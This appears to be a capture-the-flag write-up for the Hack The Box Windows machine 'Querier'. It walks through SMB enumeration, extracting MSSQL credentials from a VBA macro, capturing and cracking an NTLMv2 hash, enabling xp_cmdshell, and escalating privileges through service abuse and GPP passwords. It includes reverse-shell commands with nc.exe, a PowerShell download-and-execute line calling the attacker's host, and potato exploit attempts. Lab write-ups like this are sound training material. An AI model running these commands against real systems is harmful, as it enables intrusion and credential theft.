## Default Information
IP Address: 10.10.10.125\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.125    querier.htb
```
### Masscan
Firstly, we will use rustscan to identify the open ports

```
Open 10.10.10.125:135
Open 10.10.10.125:139
Open 10.10.10.125:445
Open 10.10.10.125:1433
Open 10.10.10.125:5985
Open 10.10.10.125:47001
Open 10.10.10.125:49664
Open 10.10.10.125:49665
Open 10.10.10.125:49666
Open 10.10.10.125:49669
Open 10.10.10.125:49667
Open 10.10.10.125:49671
Open 10.10.10.125:49668
Open 10.10.10.125:49670
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 135 | msrpc | Microsoft Windows RPC | Open |
| 139 | netbios-ssn |  Microsoft Windows netbios-ssn | Open |
| 445 | microsoft-ds|  NIL | Open |
| 1433| ms-sql-s |  Microsoft SQL Server 2017 14.00.1000.00; RTM | Open |
| 5985| http | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | Open |
|47001| http | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | Open |

Looking at the nmap output, we realize that port 139 and port 445 are open. This means that this machine probable has open SMB servers. We will test for null authentication on the SMB servers on port 139 and 445 later.

Apart from that, the service on port 1433 is Microsoft SQL Server 2007. This means that we might be able to execute SQL queries on the SQL Server if we are able to obtain credentials for the SQL Server.

Lastly, looking at ports 5985 and 47005, we think that this machine uses winrm as well. We can potentially use evil-winrm to authenticate to the server.

### SMB Enumeration on port 139
We will first try to list the shares and authenticate with null authentication on port 139. Unfortunately, we are unable to authenticate using null authentication on port 139.


```
┌──(kali㉿kali)-[~/Desktop/querier]
└─$ smbmap -u "" -p "" -H 10.10.10.125 -P 139 2>&1
[!] RPC Authentication error occurred
[!] Authentication error on 10.10.10.125
                                                                                                       
┌──(kali㉿kali)-[~/Desktop/querier]
└─$ smbmap -u "" -p null -H 10.10.10.125 -P 139 2>&1
[!] RPC Authentication error occurred
[!] Authentication error on 10.10.10.125
                                                                                                       
┌──(kali㉿kali)-[~/Desktop/querier]
└─$ smbmap -u null -p null -H 10.10.10.125 -P 139 2>&1
[!] RPC Authentication error occurred
[!] Authentication error on 10.10.10.125
                                                                                                       
┌──(kali㉿kali)-[~/Desktop/querier]
└─$ smbmap -u null -p "" -H 10.10.10.125 -P 139 2>&1
[!] RPC Authentication error occurred
[!] Authentication error on 10.10.10.125
```

### SMB Enumeration on port 445
Next, we will try to authenticate to port 445 using null authentication. Fortunately, we are able to authenticate to the SMB server on port 445 using null authentication.

```
┌──(kali㉿kali)-[~/Desktop/querier]
└─$ smbmap -H 10.10.10.125 -P 445 2>&1
[+] IP: 10.10.10.125:445        Name: querier.htb 
```

We will then proceed to list the shares on the SMB server using smbclient. 

```
┌──(kali㉿kali)-[~/Desktop/querier]
└─$ smbclient -L //10.10.10.125 -N -I 10.10.10.125 2>&1      

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
SMB1 disabled -- no workgroup available
```

From the smbmap output previously, we can see a Reports share. We will then use smbclient to access the Reports share. Viewing the contents of the share, we also find a ```Currenncy Volume Report.xlsm``` file. We will then download the xlsm file to our local machine

```
┌──(kali㉿kali)-[~/Desktop/querier]
└─$ smbclient -U "" //10.10.10.125/Reports 2>&1                                                  130 ⨯
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

                6469119 blocks of size 4096. 1593031 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (5.5 KiloBytes/sec) (average 5.5 KiloBytes/sec)
```

### Analysis of xlsm file
After obtaining the xlsm file on our local machine, we will use olevba to analyze the xlsm file. From the output, we can see that there is a VBA maco in the xlsm file. 

```
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
```

From the output, we are also able to extract the VBA source code that is used for the macro. In the macro, we are able to obtain the Uid and the password of the mssql database that is being used.

```
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
```

## Exploit
### Authentication to mssql database
Using the credentials that we have obtained, we are then able to authenticate to the mssql database using impacket-mssql. However, we would need to supply the ```-windows-auth``` flag in otder to authenticate successfully to the mssql database.

```
┌──(kali㉿kali)-[~/Desktop/querier]
└─$ impacket-mssqlclient 'reporting:PcwTWTHRwryjc$c6'@10.10.10.125 -port 1433 -windows-auth -debug
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

Next, we will list all the databases on the mssql server using ```SELECT NAME FROM sys.sysdatabases```. We also realize that we are only able to access master, tempdb, msdb and volume databases.

```
SQL> select name from sys.sysdatabases;
name                                                                                                                               
--------------------------------------------------------------------------------------------------------------------------------   
master                                                                                                                             
tempdb                                                                                                                             
model                                                                                                                              
msdb                                                                                                                               
volume
```

Next, we will check the databases and list the contents. Unfortunately, we are unable to find any interesting contents from the databases. 

```
SQL> use master; SELECT * from SYSOBJECTS where xtype='U';
SQL> use tempdb; SELECT * from SYSOBJECTS where xtype='U';
SQL> use msdb; SELECT * from SYSOBJECTS where xtype='U';
SQL> use volume; SELECT * from SYSOBJECTS where xtype='U';
```

Next, we shall try to execute commands on the mssql database. Unfortunately, the current user does not have the privileges to execute command on the mssql database. The current user also does not have the privileges to reconfigure the xp_cmdshell to execute command on the mssql database

```
SQL> sp_configure 'show advanced options', '1'
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
SQL> EXEC master..xp_cmdshell 'whoami'
[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```
### Extracting NTLMv2 hashes

Next, we will try to capture the NTLM hashes of the mssql database. To do that, we will first have set up a responder on our local machine. Afterwards, we will execute the dirtree command on the mssql database

```
SQL> EXEC master..xp_dirtree '\\10.10.16.6\share'
```

Afterwards, we will use responder to capture the NTLMv2 hash for the user ```mssql-svc```

```
[+] Listening for events...                                                                            

[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:bebb05162da87b55:51F1FCC88A2041CE6AB5617BE6CB983A:010100000000000000C30F42656AD801AC44F8FD7693B8610000000002000800370031005900330001001E00570049004E002D004F004F0055005700300048003200490035004300430004003400570049004E002D004F004F005500570030004800320049003500430043002E0037003100590033002E004C004F00430041004C000300140037003100590033002E004C004F00430041004C000500140037003100590033002E004C004F00430041004C000700080000C30F42656AD8010600040002000000080030003000000000000000000000000030000038603F6D13637562F6C83DFDBB275BD46B340CC07681072E72769720557AB4BE0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003600000000000000000000000000
```

Lastly, we will use hashcat to crack the NTLMv2 hash that we have obtained

```
┌──(kali㉿kali)-[~/Desktop/querier]
└─$ hashcat -m 5600 hash.txt /home/kali/Desktop/pentest/wordlist/rockyou.txt
MSSQL-SVC::QUERIER:bebb05162da87b55:51f1fcc88a2041ce6ab5617be6cb983a:010100000000000000c30f42656ad801ac44f8fd7693b8610000000002000800370031005900330001001e00570049004e002d004f004f0055005700300048003200490035004300430004003400570049004e002d004f004f005500570030004800320049003500430043002e0037003100590033002e004c004f00430041004c000300140037003100590033002e004c004f00430041004c000500140037003100590033002e004c004f00430041004c000700080000c30f42656ad8010600040002000000080030003000000000000000000000000030000038603f6d13637562f6c83dfdbb275bd46b340cc07681072e72769720557ab4be0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000:corporate568
```

### Priviilege Escalation to mssql-svc
However, we realize that we are unable to authenticate to mssql-svc via evil-winrm using this set of credentials

```
┌──(kali㉿kali)-[~/Desktop/querier]
└─$ evil-winrm -i 10.10.10.125 -u 'mssql-svc' -p 'corporate568'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

We shall try to authenticate to impacket-mssqlclient using the set of credentials that we have obtained. Fortunately, we are able to authenticate to mssql-svc using impacket-mssqlclient.
```
┌──(kali㉿kali)-[~/Desktop/querier]
└─$ impacket-mssqlclient 'mssql-svc:corporate568'@10.10.10.125 -port 1433 -windows-auth -debug
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

Next, we shall try to configure the xp_cmdshell and execute commands on the mssql client on the mssql-svc user.

```
SQL> sp_configure 'show advanced options', '1'
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> sp_configure 'xp_cmdshell', '1'
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> EXEC master..xp_cmdshell 'whoami'
output                                                                                                                                                                                                                                                            

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   

querier\mssql-svc                                                                                                                                                                                                                                                 

NULL                                                                                                                                                                                                                                                              

SQL> 
```

Lastly, we will host the nc.exe on our local machine and start a smb server. For this machine, we will have to use ```-smb2support``` as the mssql server does not support SMB1 protocol
```
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-smbserver share querier -smb2support
```

We will then use xp_cmdshell to execute a reverse shell on mssql database

```
SQL> EXEC master..xp_cmdshell "\\10.10.16.6\share\nc.exe -e cmd.exe 10.10.16.6 4000"
```

Afterwards, we will be able to obtain a reverse shell connection on our listening port on our local machine

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.125] 49701
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami

```
### Obtaining user flag
```
C:\Users\mssql-svc\Desktop>type user.txt
type user.txt
<Redacted user flag>
```

### Privilege Escalation to SYSTEM
Using the PowerUp.ps1 script, we realize that we can exploit the UsoSvc service due to overly-permissive permissions that is set on the service.

```
ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services
```

Next, we will have to transfer the nc.exe executable to our C:\temp directory and we can use the ```Invoke-ServiceAbuse``` command to obtain a reverse shell connection (NOTE: We have to specify the full path location of the nc.exe executable for this exploit to work).

```
C:\temp>powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.6:3000/PowerUp.ps1');Invoke-ServiceAbuse -Name 'UsoSvc' -command 'C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000';
powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.6:3000/PowerUp.ps1');Invoke-ServiceAbuse -Name 'UsoSvc' -command 'C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000';

ServiceAbused Command                                  
------------- -------                                  
UsoSvc        C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000
```

### Obtaining root flag

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<Redacted root flag>
```
## Post-Exploitation
### Obtaining vba script
Another way of obtaining the VBA script is to rename the xlsm file to zip file. Opening up the zip file, we will be able to find a vbaProject.bin file in /xl directory. Runnign strings command on the bin file will also expose the VBA script source code as well

```
┌──(kali㉿kali)-[~/Desktop/querier]
└─$ strings vbaProject.bin               
 macro to pull data for client volume reports
n.Conn]
Open 
rver=<
SELECT * FROM volume;
word>
 MsgBox "connection successful"
Set rs = conn.Execute("SELECT * @@version;")
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
 further testing required
... 
```

### Reverse shell from mssql
Another alternative way of spawn a reverse shell connection is to download the nc.exe executable from our local computer onto the temp directory which is the ```%userprofile%\AppData\Local\Temp```. In our case, the full path of the temp directory will be C:\Users\mssql-svc\AppData\local\Temp

```
SQL> EXEC master..xp_cmdshell 'powershell.exe -command iwr -Uri http://10.10.16.6:3000/nc.exe -Outfile C:\Users\mssql-svc\AppData\local\Temp\nc.exe';
```

Afterwards, we can then execute the nc.exe executable to spawn a reverse shell connection to our the listening port on our local machine

```
SQL> EXEC master..xp_cmdshell 'C:\Users\mssql-svc\AppData\local\Temp\nc.exe -e cmd.exe 10.10.16.6 4000';
```

### Alternative reverse shell with SYSTEM privileges

Using the same reverse shell exploit as the write-up above, we can create a reverse shell connection by importing the PowerUp.ps1 module instead of using the ```DownloadString``` command. 

To do that, we have to first import the PowerUp.ps1 module into the machine (NOTE: We have to ensure that we are in the powershell.exe)

```
C:\temp>powershell.exe
powershell.exe
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\temp> import-module ./PowerUp.ps1
```

Afterwards, all we have to do is to execute the ```Invoke-ServiceAbuse``` command to create a reverse shell connection

```
PS C:\temp> Invoke-ServiceAbuse -Name 'UsoSvc' -command 'C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000'
Invoke-ServiceAbuse -Name 'UsoSvc' -command 'C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000'

ServiceAbused Command                                  
------------- -------                                  
UsoSvc        C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000
```

### Alternative way of privilege Escalation

From PowerUp.ps1, we are able to find cached GPP files that contains the password for the Administrator user

```
Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

Another way that we can extract the GPP credentials is using the ```Get-Content``` command.

```
PS C:\temp> Get-Content "C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"
Get-Content "C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"
<?xml version="1.0" encoding="UTF-8" ?><Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator" image="2" changed="2019-01-28 23:12:48" uid="{CD450F70-CDB8-4948-B908-F8D038C59B6C}" userContext="0" removePolicy="0" policyApplied="1">
<Properties action="U" newName="" fullName="" description="" cpassword="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="Administrator"></Properties></User></Groups>
PS C:\temp> 
```

Afterwards, we can use ```gpp-decrypt``` to decrypt the cpassword

```
┌──(kali㉿kali)-[~]
└─$ gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
MyUnclesAreMarioAndLuigi!!1!
```
Using the credentials, we can use impacket-psexec to gain access as the Administrator user

```
┌──(kali㉿kali)-[~]
└─$ impacket-psexec 'Administrator:MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.125.....
[*] Found writable share ADMIN$
[*] Uploading file PnuNnGTD.exe
[*] Opening SVCManager on 10.10.10.125.....
[*] Creating service rSGb on 10.10.10.125.....
[*] Starting service rSGb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

Apart from that, we can also use impacket-wmiexec to gain access as the Administrator user

```
┌──(kali㉿kali)-[~]
└─$ impacket-wmiexec 'Administrator:MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
querier\administrator
```

Lastly, we can also use impacket-smbexec to gain access as the Administrator user

```
┌──(kali㉿kali)-[~]
└─$ impacket-smbexec 'Administrator:MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

### Potato Exploits
Looking at the output of ```whoami /priv```, we realize that the SeImpersonatePrivilege is enabled. This means that the machine might be vulnerable to potato exploits.

Let us first try to do the RoguePotato exploit. We will first download the RogueOxidResolver.exe and RoguePotato.exe from [here](https://github.com/antonioCoco/RoguePotato/releases/tag/1.0). Afterwards, we will transfer to the C:\temp directory on the windows server. However, we realize that this exploit fails to work when we try to execute it

```
PS C:\temp> .\RoguePotato.exe -r 10.10.10.125 -e "C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000" -l 9999
.\RoguePotato -r 10.10.10.125 -e "C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000" -l 9999
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written:106 bytes
[-] Named pipe didn't received any connect request. Exiting ... 
```

Next, let us try using JuicyPotato exploit. We will first download the JuicyPotato.exe from [here](https://github.com/ohpe/juicy-potato/releases/). Afterwards, we will write a rev.bat file that will create a reverse shell connection.

```
C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000 
```

Next, we will transfer nc.exe to C:\temp. However, again we realize that the exploit fails when we try to execute it. 
```
C:\temp>JuicyPotato.exe -l 1337 -p "c:\windows\system32\cmd.exe" -a "/c C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000" -t *
JuicyPotato.exe -l 1337 -p "c:\windows\system32\cmd.exe" -a "/c C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
COM -> recv failed with error: 10038
```

Referencing [here](https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/) and checking the version of Windows machine that we are currently using, it seems that Windows has "patched" the exploit and so it is no longer workable on newer versions of Windows Server 2019

```
PS C:\temp> gwmi win32_operatingsystem | % caption
gwmi win32_operatingsystem | % caption
Microsoft Windows Server 2019 Standard
```
